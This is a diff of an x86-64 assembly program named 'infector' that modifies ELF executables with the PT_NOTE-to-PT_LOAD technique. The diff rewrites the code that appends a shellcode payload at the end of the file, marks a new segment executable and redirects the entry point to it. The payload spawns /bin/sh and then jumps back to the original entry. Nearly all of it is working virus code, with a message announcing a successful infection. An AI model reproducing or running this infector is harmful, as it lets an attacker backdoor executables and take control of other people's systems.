@@ -8,16 +8,15 @@ section .data
 	error_msg_args db "error, only one argument is needed. Syntax : ./infector file", 0xA, 0
 	error_msg_file db "error, the file printed is a folder. Please enter an ELF file.", 0xA, 0
 	success_msg db "Bravo, the file is well infected", 0xA, 0
-	debug_msg_pt_note_found db "pt_note trouvé", 0xA, 0
-	debug_msg_header_modified db "en tete modifié",0xA, 0
-	debug_msg_writing_payload db "program header overwrite done",0xA, 0
-	debug_parsing_elfheader db "elf header parsé",0xA, 0
-	debug_parse_loop db "loop de parsing program header",0xA, 0
-	payload db 0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb, 0x08, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05
-    payload_end:               ; Label marking the end of payload data
 
 
-	
+
+    payload_buffer: 
+        db 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb, 0x08, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0xb0, 0x3b, 0x0f, 0x05, 0x5f, 0x5e, 0x5a, 0x59, 0x5b, 0x58, 0xe9
+    jmp_offset dd 0  
+
+    payload_size equ 41  ; Correction de la taille du payload (41 au lieu de 42)
+
 section .bss 
 
 	stat_buff resb 144 ;reserve bytes(saving space) (144bytes) for the fstat command later
@@ -34,7 +33,9 @@ section .bss
 	
 	payload_len resq 1  ; Réserve 8 octets pour payload_len
 
-	relative_offset resd 1    ; Reserve 4 bytes for relative offset
+    last_load_end resq 1   ; Fin du dernier segment LOAD
+    current_save resq 1    ; Pour scanner les segments
+    temp_header resb 56    ; Buffer temporaire pour les headers
 
 
 section .text
@@ -62,11 +63,9 @@ wrong_args:
 
 
 main: 
-	
-    ; Calculate payload length and store it in payload_len
-    mov rax, payload_end
-    sub rax, payload           ; rax = payload length
-    mov [payload_len], rax     ; store the calculated length
+
+    mov rax, payload_size
+    mov [payload_len], rax
 
     call stat_file	
     call check_if_regular_file
@@ -205,9 +204,6 @@ parse_elfheader:
 	movzx rax, word[ELF_header_buff + 0x38]   ; movzx : fills the superior bytes of the rax with 0 to ensure its the good value
 	mov [phnum], rax
 
-	mov rsi, debug_parsing_elfheader
-	mov rdx, 18
-	call print_message
 
 	ret
 
@@ -225,10 +221,6 @@ parse_programm_header:
 parse_loop:
 	;save rcx in the stack
 	push rcx
-
-	mov rsi, debug_parse_loop
-	mov rdx, 32
-	call print_message
 
 	pop rcx
 
@@ -272,178 +264,197 @@ end_parse:
 
 pt_note_found:
 
+    ; Find the end of last LOAD segment to place our payload
+    mov r15, [current_phoff]       ; Save PT_NOTE offset for later modification
 
-	mov rsi, debug_msg_pt_note_found
-	mov rdx, 16
-	call print_message
+    ; Find the end of last LOAD segment to place our payload
+    mov qword [last_load_end], 0
+    mov rcx, [phnum]
+    mov rax, [phoff]
+    mov [current_save], rax
 
-	mov dword [program_header_buff], 1     ;modify program header type from PT_NOTE to PT_LOAD (in p_type)
-
-    mov dword [program_header_buff + 4], 5  ; add permissions to execute and read (PF_R | PF_X) / permissions are located in the offset + 4 of the programm header (in p_flags)
-
-	mov qword [program_header_buff + 48], 0x200000    ; p_align
-
-
-
-
-
-	; Get current file size
-	mov rax, 8              ; sys_lseek
-	mov rdi, [fd]
-	mov rsi, 0
-	mov rdx, 2              ; SEEK_END
-	syscall
-	test rax, rax
-	js error
-	mov r12, rax            ; r12 now contains the file size (EOF)
-
-
-	; Update p_offset in program header
-	mov [program_header_buff + 8], r12     ; p_offset
-
-
-
-	; Compute new p_vaddr = file size + 0x0C000000
-	mov rax, r12                           ; p_offset (current file size)
-	add rax, 0x0C000000                    ; Add high address offset
-	mov [program_header_buff + 16], rax    ; p_vaddr
-	mov [program_header_buff + 24], rax    ; p_paddr
-
-
-
-    ; Save original e_entry
-    mov rbx, [ELF_header_buff + 24]        ; Original e_entry
-
-
-	; Load payload_len into rsi
-	mov rsi, [payload_len]
-
-	; Compute the address payload + payload_len into rdi
-	lea rdi, [payload + rsi]
-
-
-	; Compute the relative offset for the jump
-	mov rax, rbx                              ; old_e_entry
-	sub rax, [program_header_buff + 16]       ; Subtract new_p_vaddr
-	sub rax, [payload_len]                    ; Subtract payload_len
-	sub rax, 5                                ; Subtract size of jmp instruction
-	mov eax, eax                              ; Ensure lower 32 bits
-	mov [relative_offset], eax                ; Store relative offset (32 bits)
-
-
-	; Append 'jmp rel32' to the end of the payload
-	mov rsi, [payload_len]
-	lea rdi, [payload + rsi]
-	mov byte [rdi], 0xE9                      ; Opcode for 'jmp rel32'
-	mov eax, [relative_offset] 
-	mov dword [rdi + 1],eax   ; Relative offset
-
-
-	; Update payload length
-	add qword [payload_len], 5
-
-
-    ; Set p_filesz and p_memsz
-    mov r13, [payload_len]
-    mov [program_header_buff + 32], r13    ; p_filesz
-    mov [program_header_buff + 40], r13    ; p_memsz
-
-    ; Write the payload to the new segment
-    mov rax, 8                             ; sys_lseek
+scan_load_segments:
+    push rcx
+    push rax
+    
+    ; Read header
+    mov rax, 8              
     mov rdi, [fd]
-    mov rsi, r12                           ; New p_offset
-    mov rdx, 0                             ; SEEK_SET
+    mov rsi, [current_save]
+    mov rdx, 0
     syscall
-    test rax, rax
+
+    mov rax, 0        
+    mov rdi, [fd]
+    mov rsi, temp_header
+    mov rdx, 56
+    syscall
+
+    ; Check if LOAD segment
+    mov eax, [temp_header]
+    cmp eax, 1    ; PT_LOAD
+    jne next_load_seg
+
+    ; Calculate end of this segment in memory
+    mov rax, [temp_header + 16]   ; p_vaddr
+    add rax, [temp_header + 32]   ; + p_filesz
+    add rax, 0x1000              ; Add page margin
+    and rax, ~0xFFF             ; Page align
+    cmp rax, [last_load_end]
+    jle next_load_seg
+    mov [last_load_end], rax
+
+next_load_seg:
+    pop rax
+    add rax, 56
+    mov [current_save], rax
+    pop rcx
+    dec rcx
+    jnz scan_load_segments
+
+    ; Calculate new virtual address for payload
+    mov r13, [last_load_end]     ; get end of the last segment
+    add r13, 0x1000              ; add margin 
+    and r13, ~0xFFF              ; align 
+
+    ; Get EOF and align it 
+    mov rax, 8              
+    mov rdi, [fd]
+    mov rsi, 0
+    mov rdx, 2              
+    syscall
+    mov r12, rax            
+
+    ; Save original entry point 
+    mov rax, 8                      
+    mov rdi, [fd]
+    mov rsi, 24                     
+    mov rdx, 0                      
+    syscall
+
+    mov rax, 0                      
+    mov rdi, [fd]
+    mov rsi, ELF_header_buff + 24   
+    mov rdx, 8
+    syscall
+    mov rbx, [ELF_header_buff + 24]  ; Original entry in rbx
+
+   ; Calculate the new closest virtual address
+    mov r13, [last_load_end]        ; base : after the last load segment
+    add r13, 0x1000                 ; one page gat is enough
+    and r13, ~0xFFF                ; align page
+
+
+	; Aligne the file offset
+    mov rax, r12                    ; EOF
+    add rax, 0xFFF                  ; round to the superior page
+    and rax, ~0xFFF                 ; align
+    mov r12, rax                    ; Save EOF aligned
+
+
+    ; Save new e_entry address
+    mov rax, 8                      
+    mov rdi, [fd]
+    mov rsi, 24                     
+    mov rdx, 0                      
+    syscall
+
+    mov rax, r13                    
+    mov [ELF_header_buff + 24], rax  ; Update e_entry
+    
+    mov rax, 1                      
+    mov rdi, [fd]
+    mov rsi, ELF_header_buff + 24
+    mov rdx, 8
+    syscall
+
+    ; Convert PT_NOTE to PT_LOAD
+    mov dword [program_header_buff], 1          ; PT_LOAD
+    mov dword [program_header_buff + 4], 5      ; RX flags
+    mov qword [program_header_buff + 8], r12    ; p_offset : EOF
+    mov qword [program_header_buff + 16], r13   ; p_vaddr
+    mov qword [program_header_buff + 24], r13   ; p_paddr
+
+
+    mov rax, payload_size
+    add rax, 0xFFF
+    and rax, ~0xFFF
+    mov qword [program_header_buff + 32], rax   ; p_filesz
+    mov qword [program_header_buff + 40], rax   ; p_memsz
+    mov qword [program_header_buff + 48], 0x1000 ; p_align
+
+     ; Calculate return jmp 
+    mov rax, rbx                    ; Original entry
+    sub rax, r13                    ; sub new base
+    sub rax, payload_size           ; Sub payload size
+    sub rax, 5                      ; ajust size bc of jmp instruction
+    mov [jmp_offset], eax           ; save offset
+
+
+    ; Write payload at EOF
+    mov rax, 8                      
+    mov rdi, [fd]
+    mov rsi, r12                    
+    mov rdx, 0                      
+    syscall
+	test rax, rax                   
     js error
 
-    mov rax, 1                             ; sys_write
-    mov rdi, [fd]
-    mov rsi, payload
-    mov rdx, [payload_len]
-    syscall
-    test rax, rax
-    js error
 
-    ; Overwrite the modified program header
-    mov rax, 8                             ; sys_lseek
+    mov rax, 1                      
     mov rdi, [fd]
-    mov rsi, [current_phoff]
-    mov rdx, 0                             ; SEEK_SET
+    mov rsi, payload_buffer
+    mov rdx, payload_size           
     syscall
-    test rax, rax
-    js error
+    cmp rax, payload_size          
+    jne error                     
 
-    mov rax, 1                             ; sys_write
+    ; write offset return 
+    mov rax, 1                      
+    mov rdi, [fd]
+    mov rsi, jmp_offset
+    mov rdx, 4                      
+    syscall
+    cmp rax, 4                     
+    jne error
+
+    ; Write modified header
+    mov rax, 8                      
+    mov rdi, [fd]
+    mov rsi, r15                    ; PT_NOTE offset previously saved
+    mov rdx, 0                      
+    syscall
+
+    mov rax, 1                      
     mov rdi, [fd]
     mov rsi, program_header_buff
-    mov rdx, 56                            ; Size of program header
+    mov rdx, 56                     
     syscall
-    test rax, rax
-    js error
 
-    ; Overwrite the ELF header
-    mov rax, 8                             ; sys_lseek
+    ; Update ELF header sections
+    mov rax, [ELF_header_buff + 40]    ; e_shoff
+    cmp rax, r12                       
+    jbe no_shoff_update
+    add rax, payload_size
+    mov [ELF_header_buff + 40], rax
+    
+    mov rax, 8                      
     mov rdi, [fd]
-    mov rsi, 0                             ; Offset 0
-    mov rdx, 0                             ; SEEK_SET
+    mov rsi, 0                     
+    mov rdx, 0                      
     syscall
-    test rax, rax
-    js error
 
-    mov rax, 1                             ; sys_write
-    mov rdi, [fd]
-    mov rsi, ELF_header_buff
-    mov rdx, 64                            ; Write full ELF header
-    syscall
-    test rax, rax
-    js error
-
-    ; Update e_shoff if necessary
-    mov rax, [ELF_header_buff + 40]        ; e_shoff
-    cmp rax, r12                           ; Compare with new p_offset
-    ja update_shoff
-    jmp skip_update
-
-update_shoff:
-    add rax, [payload_len]
-    mov [ELF_header_buff + 40], rax        ; Update e_shoff
-
-    ; Write back ELF header again after updating e_shoff
-    mov rax, 8                             ; sys_lseek
-    mov rdi, [fd]
-    mov rsi, 0                             ; Offset 0
-    mov rdx, 0                             ; SEEK_SET
-    syscall
-    test rax, rax
-    js error
-
-    mov rax, 1                             ; sys_write
+    mov rax, 1                      
     mov rdi, [fd]
     mov rsi, ELF_header_buff
-    mov rdx, 64                            ; Write full ELF header
+    mov rdx, 64                     
     syscall
-    test rax, rax
-    js error
 
-skip_update:
+no_shoff_update:
     mov rsi, success_msg
     mov rdx, 33
     call print_message
-
-
-
-    jmp end_parse
-
-
-
-;__________________________________________________________________________
-e_shoff_update:
-	add rax, payload_len
-    mov [ELF_header_buff + 40], rax  ; update shoff
-	ret
-
-
+    ret
     
 print_message:
     mov rax, 0x1               
